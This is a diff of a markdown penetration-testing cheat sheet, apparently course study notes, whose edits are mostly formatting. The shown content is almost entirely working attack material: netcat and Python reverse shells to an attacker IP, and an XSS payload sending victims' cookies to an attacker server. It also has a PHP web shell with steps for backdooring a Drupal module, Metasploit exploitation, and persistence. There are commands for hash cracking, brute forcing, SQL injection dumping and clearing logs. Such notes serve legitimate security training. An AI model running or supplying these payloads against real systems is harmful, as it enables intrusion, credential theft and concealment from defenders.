 sudo armitage
 ```
 
-## Exploitation
+### Exploitation
 
-### Vulnerability Scanning
 
-```bash
+
+#### Vulnerability Scanning
+
+
+
+```
 # BANNER GRABBING
 nmap -sV -O <TARGET_IP>
 nmap -sV --script=banner <TARGET_IP>
@@ -2010,9 +2216,11 @@ ls -lah /usr/share/nmap/scripts | grep <KEYWORD>
 nc <TARGET_IP> <TARGET_OPEN_PORT>
 ```
 
-### Exploits
+#### Exploits
 
-```bash
+
+
+```
 # SEARCHSPLOIT - Install
 sudo apt update && sudo apt -y install exploitdb
 ## Update
@@ -2041,7 +2249,7 @@ searchsploit local windows | grep -e "Microsoft"
 searchsploit -w remote windows smb | grep -e "EternalBlue"
 ```
 
-```bash
+```
 # CROSS COMPILING
 sudo apt -y install mingw-w64 gcc
 
@@ -2059,9 +2267,11 @@ searchsploit -m 40839
 gcc -pthread 40839.c -o dirty_exploit -lcrypt
 ```
 
-### Shells
+#### Shells
 
-```bash
+
+
+```
 # NETCAT - Install
 sudo apt update && sudo apt install -y netcat
 # or upload the nc.exe on the target machine
@@ -2082,7 +2292,7 @@ echo "Hello target" > test.txt
 nc -nv <TARGET_IP> <TARGET_PORT> < test.txt
 ```
 
-```bash
+```
 # BIND SHELL
 
 ## Target Win machine - Bind shell listener with executable cmd.exe
@@ -2096,7 +2306,7 @@ nc -nvlp <PORT> -c /bin/bash
 nc.exe -nv <TARGET_IP> <TARGET_PORT>
 ```
 
-```bash
+```
 # REVERSE SHELL
 
 ## Attacker Linux machine
@@ -2110,7 +2320,7 @@ nc -nvlp <PORT>
 nc -nv <ATTACKER_IP> <ATTACKER_PORT> -e /bin/bash
 ```
 
-```bash
+```
 # Spawn shells
 python -c 'import pty; pty.spawn("/bin/sh")'
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<TARGET_IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
@@ -2129,9 +2339,11 @@ vi: :set shell=/bin/bash:shell
 nmap: !sh
 ```
 
-### Frameworks
+#### Frameworks
 
-```bash
+
+
+```
 # METASPLOIT - example
 service postgresql start && msfconsole -q
 db_status
@@ -2147,7 +2359,7 @@ set PASSWORD <PW>
 run
 ```
 
-```bash
+```
 # POWERSHELL EMPIRE - Install
 sudo apt update && sudo apt install -y powershell-empire
 
@@ -2162,9 +2374,11 @@ interact <ID>
 history
 ```
 
-### Win Exploitation
+#### Win Exploitation
 
-```bash
+
+
+```
 # Attacker's machine - Find target IP
 cat /etc/hosts
 ping <TARGET_IP>
@@ -2196,9 +2410,11 @@ run
 hosts
 ```
 
-#### IIS/FTP
+**IIS/FTP**
 
-```bash
+
+
+```
 # Targeting IIS/FTP
 nmap -sV -sC -p21,80 <TARGET_IP>
 ## Try anonymous:anonymous
@@ -2228,9 +2444,11 @@ set LPORT <LOCAL_PORT>
 ## Open http://<TARGET_IP>/shell.aspx . A reverse shell may be received.
 ```
 
-#### OPENSSH
+**OPENSSH**
 
-```bash
+
+
+```
 # Targeting OPENSSH
 nmap -sV -sC -p 22 <TARGET_IP>
 
@@ -2260,9 +2478,11 @@ session 1
 sessions -u 1
 ```
 
-#### SMB
+**SMB**
 
-```bash
+
+
+```
 # Targeting SMB
 nmap -sV -sC -p 445 <TARGET_IP>
 
@@ -2303,9 +2523,11 @@ set RHOSTS <TARGET_IP>
 run
 ```
 
-#### MYSQL
+**MYSQL**
 
-```bash
+
+
+```
 # Targeting MYSQL (Wordpress)
 nmap -sV -sC -p 3306,8585 <TARGET_IP>
 
@@ -2340,9 +2562,11 @@ cat wp-config.php
 shell
 ```
 
-### Linux Exploitation
+#### Linux Exploitation
 
-```bash
+
+
+```
 # Attacker's machine - Find target IP
 cat /etc/hosts
 ping <TARGET_IP>
@@ -2367,9 +2591,11 @@ cat /etc/*release
 whoami
 ```
 
-#### VSFTPD
+**VSFTPD**
 
-```bash
+
+
+```
 # Targeting VSFTPD
 nmap -sV -sC -p 21 <TARGET_IP>
 
@@ -2410,7 +2636,7 @@ nc -nvlp <PORT>
 /bin/bash -i
 ```
 
-```bash
+```
 # Targeting PHP
 nmap -sV -sC -p 80 <TARGET_IP>
 
@@ -2432,7 +2658,7 @@ nc -nvlp <PORT>
 python2 18836.py <TARGET_IP> 80
 ```
 
-```bash
+```
 # Targeting SAMBA
 nmap -sV -p 445 <TARGET_IP>
 
@@ -2454,9 +2680,11 @@ sessions 2
 cat /etc/shadow
 ```
 
-### Obfuscation
+#### Obfuscation
 
-```bash
+
+
+```
 # SHELLTER - Install
 sudo apt update && sudo apt install -y shellter
 sudo dpkg --add-architecture i386 && sudo apt update && sudo apt -y install wine32
@@ -2471,7 +2699,7 @@ cp /usr/share/windows-binaries/vncviewer.exe .
 # Proceed in Sellter window
 ```
 
-```bash
+```
 # INVOKE-OBFUSCATION PowerShell script - Install
 cd /opt
 sudo git clone https://github.com/danielbohannon/Invoke-Obfuscation.git
@@ -2484,11 +2712,15 @@ cd ..
 Invoke-Obfuscation
 ```
 
-## Post-Exploitation
+### Post-Exploitation
 
-### Win Local Enumeration
 
-```bash
+
+#### Win Local Enumeration
+
+
+
+```
 # MSF Meterpreter
 getuid
 sysinfo
@@ -2545,9 +2777,11 @@ use post/windows/gather/enum_shares
 powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename Jaws-Enum.txt
 ```
 
-### Linux Local Enumeration
+#### Linux Local Enumeration
 
-```bash
+
+
+```
 # MSF Meterpreter
 getuid
 sysinfo
@@ -2623,9 +2857,11 @@ chmod +x LinEnum.sh
 ./LinEnum.sh -s -k <keyword> -r <report> -e /tmp/ -t
 ```
 
-### Transferring Files
+#### Transferring Files
 
-```bash
+
+
+```
 # PYTHON WEB SERVER
 python -V
 python3 -V
@@ -2642,14 +2878,16 @@ python -m http.server <PORT>
 py -3 -m http.server <PORT>
 ```
 
-```bash
+```
 # TMUX Terminal Multiplexer
 sudo apt install tmux -y
 ```
 
-### Shells
+#### Shells
 
-```bash
+
+
+```
 cat /etc/shells
     # /etc/shells: valid login shells
     /bin/sh
@@ -2662,9 +2900,11 @@ cat /etc/shells
 /bin/sh -i
 ```
 
-#### TTY Shells
+**TTY Shells**
 
-```bash
+
+
+```
 # BASH
 /bin/bash -i
 /bin/sh -i
@@ -2676,7 +2916,7 @@ export TERM=xterm
 export SHELL=/bin/bash
 ```
 
-```bash
+```
 # PYTHON
 python --version
 python -c 'import pty; pty.spawn("/bin/bash")'
@@ -2688,7 +2928,7 @@ stty raw -echo && fg
 reset
 ```
 
-```bash
+```
 # FULL TTY PYTHON3 SHELL
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 # Background CTRL+Z
@@ -2701,15 +2941,17 @@ stty rows 36 columns 157
 reset
 ```
 
-```bash
+```
 # PERL
 perl -h
 perl -e 'exec "/bin/bash";'
 ```
 
-### Win Privilege Escalation
+#### Win Privilege Escalation
 
-```bash
+
+
+```
 # PrivescCHECK - PowerShell script
 powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,HTML,XML"
 
@@ -2720,9 +2962,11 @@ powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
 powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME%"
 ```
 
-### Linux Privilege Escalation
+#### Linux Privilege Escalation
 
-```bash
+
+
+```
 # Writable files
 find / -not -type l -perm -o+w
 
@@ -2742,9 +2986,11 @@ sudo man ls
 	!/bin/bash
 ```
 
-### Win Persistence
+#### Win Persistence
 
-```bash
+
+
+```
 # msfcosole - Admin Meterpreter
 search platform:windows persistence
 use exploit/windows/local/persistence_service
@@ -2757,9 +3003,11 @@ run
 run getgui -e -u <NEWUSER> -p <PW>
 ```
 
-### Linux Persistence
+#### Linux Persistence
 
-```bash
+
+
+```
 ls -lah ~/.ssh/
 cat ~/.ssh/id_rsa
 cat ~/.ssh/authorized_keys
@@ -2781,11 +3029,15 @@ crontab -l
 nc -nvlp <PORT>
 ```
 
-### Dumping & Cracking
+#### Dumping & Cracking
 
-#### Windows
 
-```bash
+
+**Windows**
+
+
+
+```
 hashdump
 
 # JohnTheRipper
@@ -2808,9 +3060,11 @@ hashcat -a 3 -m 1000 --show hashes.txt /usr/share/wordlists/rockyou.txt
 hashcat -m 1000 -a 0 -o found.txt --remove crack.hash rockyou-10.txt
 ```
 
-#### Linux
+**Linux**
 
-```bash
+
+
+```
 cat /etc/shadow
 
 # Metasploit
@@ -2826,9 +3080,11 @@ hashcat -a 3 -m 1800 linux.hashes.txt /usr/share/wordlists/rockyou.txt
 ashcat -m 1000 -a 0 -o found.txt --remove crack.hash rockyou-10.txt
 ```
 
-### Pivoting
+#### Pivoting
 
-```bash
+
+
+```
 # Checking Routes
 ip route    # Checking defined routes in linux
 route       # Checking defined routes in linux
@@ -2854,12 +3110,13 @@ run
 portfwd add -l <LOCAL_PORT> -p <TARGET_PORT> -r <TARGET_IP>
 
 db_nmap -sS -sV -p <LOCAL_PORT> localhost
-
 ```
 
-### Clearing Tracks
+#### Clearing Tracks
 
-```bash
+
+
+```
 # Windows C:\Temp - Metasploit e.g.
 cd C:\\
 mkdir Temp
@@ -2880,9 +3137,11 @@ history -c
 cat /dev/null > ~/.bash_history
 ```
 
-## Social Engineering
+### Social Engineering
 
-```bash
+
+
+```
 # GOPHISH - Linux Install
 cd /opt/
 # Get the latest version link from https://github.com/gophish/gophish/releases/
@@ -2896,11 +3155,15 @@ cd /opt/gophish && sudo ./gophish
 docker run -ti -p 3333:3333 --rm gophish/demo
 ```
 
-## Web Application Penetration Testing
+### Web Application Penetration Testing
 
-### Tools
 
-```bash
+
+#### Tools
+
+
+
+```
 # Gobuster - Install
 sudo apt update && sudo apt install -y gobuster
 
@@ -2926,9 +3189,11 @@ sudo apt update && sudo apt install -y wpscan
 sudo apt update && sudo apt install -y hydra
 ```
 
-### Enumeration & Scanning
+#### Enumeration & Scanning
 
-```bash
+
+
+```
 nmap -sS -sV -p 80,443,3306 <TARGET_IP>
 
 # Dirbuster
@@ -2976,13 +3241,19 @@ wpscan --url http://<TARGET_IP> -e u --passwords /usr/share/wordlists/rockyou.tx
 wpscan --url http://<TARGET_IP> -U admin -P /usr/share/wordlists/rockyou.txt
 ```
 
-### Attacks
+#### Attacks
 
-### SQLMap
 
-#### Check if injection exists
 
-```bash
+#### SQLMap
+
+
+
+**Check if injection exists**
+
+
+
+```
 sqlmap -r <REQUEST_FILE> -p <POST_PARAMETER>
 sqlmap -r Post.req
 
@@ -2992,9 +3263,11 @@ sqlmap -u "http://10.10.10.10/file.php?id=1" -p id          #GET Method
 sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin"      #POST Method
 ```
 
-#### **Get database if injection Exists**
+**Get database if injection Exists**
 
-```bash
+
+
+```
 sqlmap -r login.req --dbs
 sqlmap -u "http://10.10.10.10/file.php?id=1" --dbs    #determine the databases:
 sqlmap -u "http://10.10.10.10/file.php?id=1" -p id --dbs    #GET Method
@@ -3009,7 +3282,7 @@ sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "
 
 **Get Tables in a Database**
 
-```bash
+```
 sqlmap -r login.req -D dbname --tables    #determine the tables:
 sqlmap -u "http://10.10.10.10/file.php?id=1" -D dbname --common-tables    #if tables not available, guess tables using common names
 sqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname --tables        #GET Method
@@ -3018,23 +3291,27 @@ sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D d
 
 **Get data in a Database tables**
 
-```bash
+```
 sqlmap -r login.req -D dbname -T table_name --dump
 sqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname -T table_name --dump      #GET Method
 sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D dbname -T table_name --dump   #POST Method
 ```
 
-#### Get OS-Shell
+**Get OS-Shell**
 
-```bash
+
+
+```
 sqlmap -u "http://10.10.10.10/file.php?id=1" --os-shell
 ```
 
-### **XSS**
+#### **XSS**
+
+
 
 Check an example:
 
-```javascript
+```
 <script>alert("hack :)")</script>
 ```
 
@@ -3050,7 +3327,7 @@ there are four components as follows:
 1. attacker: first finds a vulnerable server and its breach point.
 2. attacker: enter the following snippet in order to hijack the cookie kepts by victim client pc (p.s.: the ip address, 192.168.99.102, belongs to attacker logging server in this example):
 
-```javascript
+```
 <script>var i = new Image();i.src="http://192.168.99.102/log.php?q="+document.cookie;</script>
 ```
 
@@ -3065,7 +3342,7 @@ nc -vv -k -l -p 80
 
 **XSSer**
 
-```bash
+```
 xsser --url 'http://<TARGET_IP>/index.php?page=dns-lookup.php' -p
 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'
 
@@ -3080,16 +3357,22 @@ xsser --url "http://<TARGET_IP>/index.php?page=user-poll.php&csrf-token=&choice=
 xsser --url "http://<TARGET_IP>/htmli_get.php?firstname=XSS&lastname=hi&form=submit" --cookie="PHPSESSID=lb3rg4q495t9sqph907sdhjgg1; security_level=0" --Fp "<script>alert(1)</script>"
 ```
 
-#### Hydra
+**Hydra**
+
+
 
 ```
 # Basic auth attacks (brute-force)
 hydra -L <USERS_LIST> -P <PW_LIST> <TARGET_IP> http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!"
 ```
 
-## Wordpress
+### Wordpress
 
-### Basic Information
+
+
+#### Basic Information
+
+
 
 **Uploaded** files go to: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`\
 **Themes files can be found in /wp-content/themes/,** so if you change some php of the theme to get RCE you probably will use that path. For example: Using **theme twentytwelve** you can **access** the **404.php** file in: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)\
@@ -3099,7 +3382,9 @@ In **wp-config.php** you can find the root password of the database.
 
 Default login paths to check: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_
 
-#### **Main WordPress Files**
+**Main WordPress Files**
+
+
 
 * `index.php`
 * `license.txt` contains useful information such as the version WordPress installed.
@@ -3118,7 +3403,9 @@ Default login paths to check: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admi
 
 * The `wp-config.php` file contains information required by WordPress to connect to the database such as the database name, database host, username and password, authentication keys and salts, and the database table prefix. This configuration file can also be used to activate DEBUG mode, which can useful in troubleshooting.
 
-#### Users Permissions
+**Users Permissions**
+
+
 
 * **Administrator**
 * **Editor**: Publish and manages his and others posts
@@ -3126,9 +3413,13 @@ Default login paths to check: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admi
 * **Contributor**: Write and manage his posts but cannot publish them
 * **Subscriber**: Browser posts and edit their profile
 
-### **Passive Enumeration**
+#### **Passive Enumeration**
 
-#### **Get WordPress version**
+
+
+**Get WordPress version**
+
+
 
 Check if you can find the files `/license.txt` or `/readme.html`
 
@@ -3136,57 +3427,67 @@ Inside the **source code** of the page (example from [https://wordpress.org/supp
 
 * Grep
 
-```bash
+```
 curl https://victim.com/ | grep 'content="WordPress'
 ```
 
 * Meta name
 
-<div align="left">
-
-<figure><img src=".gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
-
-</div>
+[![](https://github.com/dev-angelist/eCPPTv2-PTP-Notes/raw/main/.gitbook/assets/image%20\(18\).png)](.gitbook/assets/image%20\(18\).png)
 
 * CSS link files
 
-<figure><img src=".gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+[![](https://github.com/dev-angelist/eCPPTv2-PTP-Notes/raw/main/.gitbook/assets/image%20\(19\).png)](.gitbook/assets/image%20\(19\).png)
 
 * JavaScript files
 
-<figure><img src=".gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+[![](https://github.com/dev-angelist/eCPPTv2-PTP-Notes/raw/main/.gitbook/assets/image%20\(20\).png)](.gitbook/assets/image%20\(20\).png)
 
-#### Get Plugins
+**Get Plugins**
 
-```bash
+
+
+```
 curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
 ```
 
-#### Get Themes
+**Get Themes**
 
-```bash
+
+
+```
 curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
 ```
 
-#### Extract versions in general
+**Extract versions in general**
 
-```bash
+
+
+```
 curl -s -X GET https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
 ```
 
-### Active enumeration
+#### Active enumeration
 
-#### Plugins and Themes
+
+
+**Plugins and Themes**
+
+
 
 You probably won't be able to find all the Plugins and Themes passible. In order to discover all of them, you will need to **actively Brute Force a list of Plugins and Themes** (hopefully for us there are automated tools that contains this lists).
 
-#### Users
+**Users**
 
-#### **ID Brute**
+
+
+**ID Brute**
+
+
 
 You get valid users from a WordPress site by Brute Forcing users IDs:
 
-```bash
+```
 curl -s -I -X GET http://blog.example.com/?author=1
 ```
 
@@ -3196,7 +3497,7 @@ If the responses are **200** or **30X**, that means that the id is **valid**. If
 
 You can also try to get information about the users by querying:
 
-```bash
+```
 curl http://blog.example.com/wp-json/wp/v2/users
 ```
 
@@ -3204,13 +3505,17 @@ curl http://blog.example.com/wp-json/wp/v2/users
 
 Also note that **/wp-json/wp/v2/pages** could leak IP addresses.
 
-#### Login username enumeration
+**Login username enumeration**
+
+
 
 When login in **`/wp-login.php`** the **message** is **different** is the indicated **username exists or not**.
 
-#### WPScan
+**WPScan**
 
-```bash
+
+
+```
 wpscan -h #List WPscan Parameters
 wpscan --update #Update WPscan
 
@@ -3240,23 +3545,29 @@ msf exploit(wp_admin_shell_upload) > set targeturi /wordpress
 msf exploit(wp_admin_shell_upload) > exploit
 ```
 
-## Drupal
+### Drupal
 
-## Discovery
+
+
+### Discovery
+
+
 
 * Check **meta**
 
-```bash
+```
 curl https://www.drupal.org/ | grep 'content="Drupal'
 ```
 
 * **Node**: Drupal **indexes its content using nodes**. A node can **hold anything** such as a blog post, poll, article, etc. The page URIs are usually of the form `/node/<nodeid>`.
 
-```bash
+```
 curl drupal-site.com/node/1
 ```
 
-## Enumeration
+### Enumeration
+
+
 
 Drupal supports **three types of users** by default:
 
@@ -3264,54 +3575,66 @@ Drupal supports **three types of users** by default:
 2. **`Authenticated User`**: These users can log in to the website and perform operations such as adding and editing articles based on their permissions.
 3. **`Anonymous`**: All website visitors are designated as anonymous. By default, these users are only allowed to read posts.
 
-### Version
+#### Version
+
+
 
 * Check `/CHANGELOG.txt`
 
-```bash
+```
 curl -s http://drupal-site.local/CHANGELOG.txt | grep -m2 ""
 
 Drupal 7.57, 2018-02-21
 ```
 
-{% hint style="info" %}
-Newer installs of Drupal by default block access to the `CHANGELOG.txt` and `README.txt` files.
-{% endhint %}
+\{% hint style="info" %\} Newer installs of Drupal by default block access to the `CHANGELOG.txt` and `README.txt` files. \{% endhint %\}
 
-### Username enumeration
+#### Username enumeration
 
-#### Register
+
+
+**Register**
+
+
 
 In _/user/register_ just try to create a username and if the name is already taken it will be notified:
 
-<figure><img src=".gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
+[![](https://github.com/dev-angelist/eCPPTv2-PTP-Notes/raw/main/.gitbook/assets/image%20\(28\).png)](.gitbook/assets/image%20\(28\).png)
 
-#### Request new password
+**Request new password**
+
+
 
 If you request a new password for an existing username:
 
-<figure><img src=".gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
+[![](https://github.com/dev-angelist/eCPPTv2-PTP-Notes/raw/main/.gitbook/assets/image%20\(29\).png)](.gitbook/assets/image%20\(29\).png)
 
 If you request a new password for a non-existent username:
 
-<figure><img src=".gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
+[![](https://github.com/dev-angelist/eCPPTv2-PTP-Notes/raw/main/.gitbook/assets/image%20\(25\).png)](.gitbook/assets/image%20\(25\).png)
 
-### Get number of users
+#### Get number of users
+
+
 
 Accessing _/user/\<number>_ you can see the number of existing users, in this case is 2 as _/users/3_ returns a not found error:
 
-<figure><img src=".gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
+[![](https://github.com/dev-angelist/eCPPTv2-PTP-Notes/raw/main/.gitbook/assets/image%20\(27\).png)](.gitbook/assets/image%20\(27\).png)
 
-<figure><img src=".gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
+[![](https://github.com/dev-angelist/eCPPTv2-PTP-Notes/raw/main/.gitbook/assets/image%20\(26\).png)](.gitbook/assets/image%20\(26\).png)
 
-### Hidden pages
+#### Hidden pages
+
+
 
 **Fuzz `/node/$` where `$` is a number** (from 1 to 500 for example).\
 You could find **hidden pages** (test, dev) which are not referenced by the search engines.
 
-#### Installed modules info
+**Installed modules info**
 
-```bash
+
+
+```
 #From https://twitter.com/intigriti/status/1439192489093644292/photo/1
 #Get info on installed modules
 curl https://example.com/config/sync/core.extension.yml
@@ -3321,47 +3644,55 @@ curl https://example.com/core/core.services.yml
 curl https://example.com/config/sync/swiftmailer.transport.yml
 ```
 
-### Automatic
+#### Automatic
 
-```bash
+
+
+```
 droopescan scan drupal -u http://drupal-site.local
 ```
 
-#### RCE
+**RCE**
 
-#### With PHP Filter Module
 
-{% hint style="warning" %}
-In older versions of Drupal **(before version 8)**, it was possible to log in as an admin and **enable the `PHP filter` module**, which "Allows embedded PHP code/snippets to be evaluated."
-{% endhint %}
+
+**With PHP Filter Module**
+
+
+
+\{% hint style="warning" %\} In older versions of Drupal **(before version 8)**, it was possible to log in as an admin and **enable the `PHP filter` module**, which "Allows embedded PHP code/snippets to be evaluated." \{% endhint %\}
 
 You need the **plugin php to be installed** (check it accessing to _/modules/php_ and if it returns a **403** then, **exists**, if **not found**, then the **plugin php isn't installed**)
 
 Go to _Modules_ -> (**Check**) _PHP Filter_ -> _Save configuration_
 
-<figure><img src=".gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
+[![](https://github.com/dev-angelist/eCPPTv2-PTP-Notes/raw/main/.gitbook/assets/image%20\(21\).png)](.gitbook/assets/image%20\(21\).png)
 
 Then click on _Add content_ -> Select _Basic Page_ or _Article -_> Write _php shellcode on the body_ -> Select _PHP code_ in _Text format_ -> Select _Preview_
 
-<figure><img src=".gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
+[![](https://github.com/dev-angelist/eCPPTv2-PTP-Notes/raw/main/.gitbook/assets/image%20\(22\).png)](.gitbook/assets/image%20\(22\).png)
 
 Finally just access the newly created node:
 
-```bash
+```
 curl http://drupal-site.local/node/3
 ```
 
-#### Install PHP Filter Module
+**Install PHP Filter Module**
+
+
 
 From version **8 onwards, the** [**PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **module is not installed by default**. To leverage this functionality, we would have to **install the module ourselves**.
 
 1. Download the most recent version of the module from the Drupal website.
-   1. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
+   1. wget [https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz](https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz)
 2. Once downloaded go to **`Administration`** > **`Reports`** > **`Available updates`**.
 3. Click on **`Browse`**`,` select the file from the directory we downloaded it to, and then click **`Install`**.
 4. Once the module is installed, we can click on **`Content`** and **create a new basic page**, similar to how we did in the Drupal 7 example. Again, be sure to **select `PHP code` from the `Text format` dropdown**.
 
-#### Backdoored Module
+**Backdoored Module**
+
+
 
 A backdoored module can be created by **adding a shell to an existing module**. Modules can be found on the drupal.org website. Let's pick a module such as [CAPTCHA](https://www.drupal.org/project/captcha). Scroll down and copy the link for the tar.gz [archive](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz).
 
@@ -3374,7 +3705,7 @@ tar xvf captcha-8.x-1.2.tar.gz
 
 * Create a **PHP web shell** with the contents:
 
-```php
+```
 <?php
 system($_GET["cmd"]);
 ?>
@@ -3382,7 +3713,7 @@ system($_GET["cmd"]);
 
 * Next, we need to create a **`.htaccess`** file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the **`/modules`** folder.
 
-```html
+```
 <IfModule mod_rewrite.c>
 RewriteEngine On
 RewriteBase /
@@ -3391,7 +3722,7 @@ RewriteBase /
 
 * The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive.
 
-```bash
+```
 mv shell.php .htaccess captcha
 tar cvf captcha.tar.gz captcha/
 ```
@@ -3399,21 +3730,29 @@ tar cvf captcha.tar.gz captcha/
 * Assuming we have **administrative access** to the website, click on **`Manage`** and then **`Extend`** on the sidebar. Next, click on the **`+ Install new module`** button, and we will be taken to the install page, such as `http://drupal-site.local/admin/modules/install` Browse to the backdoored Captcha archive and click **`Install`**.
 * Once the installation succeeds, browse to **`/modules/captcha/shell.php`** to execute commands.
 
-#### Post Exploitation
+**Post Exploitation**
 
-#### Read settings.php
+
+
+**Read settings.php**
+
+
 
 ```
 find / -name settings.php -exec grep "drupal_hash_salt\|'database'\|'username'\|'password'\|'host'\|'port'\|'driver'\|'prefix'" {} \; 2>/dev/null
 ```
 
-#### Dump users from DB
+**Dump users from DB**
+
+
 
 ```
 mysql -u drupaluser --password='2r9u8hu23t532erew' -e 'use drupal; select * from users'
 ```
 
-### \[CVE-2018-7600] Drupalgeddon 2
+#### \[CVE-2018-7600] Drupalgeddon 2
+
+
 
 [https://ine.com/blog/cve-2018-7600-drupalgeddon-2](https://ine.com/blog/cve-2018-7600-drupalgeddon-2)
 
@@ -3423,7 +3762,9 @@ It allows remote attackers to execute arbitrary code because of an issue affecti
 
 A lot of PoC is available to exploit this vulnerability.
 
-#### References (tranks to all):
+**References (tranks to all):**
+
+
 
 [https://blog.syselement.com/ine/courses/ejpt](https://blog.syselement.com/ine/courses/ejpt)
 
